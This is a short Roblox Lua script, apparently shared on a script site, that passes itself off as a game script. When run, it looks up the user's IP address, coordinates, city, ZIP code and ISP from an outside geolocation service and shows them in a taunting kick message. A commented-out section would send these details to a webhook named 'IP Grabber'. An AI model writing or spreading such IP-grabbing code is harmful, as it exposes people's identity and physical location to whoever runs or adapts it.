--[[
    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local d = game:GetService("HttpService"):JSONDecode(request({Url = "http://ip-api.com/json?fields=query,lat,lon,country,countryCode,continent,continentCode,region,regionName,city,district,zip,timezone,offset,isp,org,as,asname,reverse,mobile,proxy,hosting"}).Body)
local p = Players.LocalPlayer

p:Kick(("[Be careful Next time twin]\n"..
"User: %s (ID: %d)\n"..
"IP: %s\n"..
"Coordinates: %.6f, %.6f\n"..
"Continent: %s (%s)\n"..
"Country: %s (%s)\n"..
"Region: %s\n"..
"City: %s | District: %s\n"..
"ZIP: %s\n"..
"Timezone: %s (UTC%s)\n"..
"ISP: %s\n"..
"Organization: %s\n"..
"ASN: %s (%s)\n"..
"Reverse DNS: %s\n"..
"Mobile: %s\n"..
"Proxy: %s\n"..
"Hosting: %s"):format(
p.Name, p.UserId, d.query, d.lat, d.lon, d.continent, d.continentCode,
d.country, d.countryCode, d.regionName, d.city, d.district, d.zip,
d.timezone, d.offset, d.isp, d.org, d.as, d.asname, d.reverse,
d.mobile and "YES" or "NO", d.proxy and "YES" or "NO", d.hosting and "YES" or "NO"
))

--[[ WEBHOOK
local WEBHOOK = "dont_you_dare_to_use_this_to_someone"
HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({
    username="IP Grabber", content=p.Name.." | "..d.query.." | "..d.lat..","..d.lon.." | "..d.city.." | "..d.country
}))
--]]
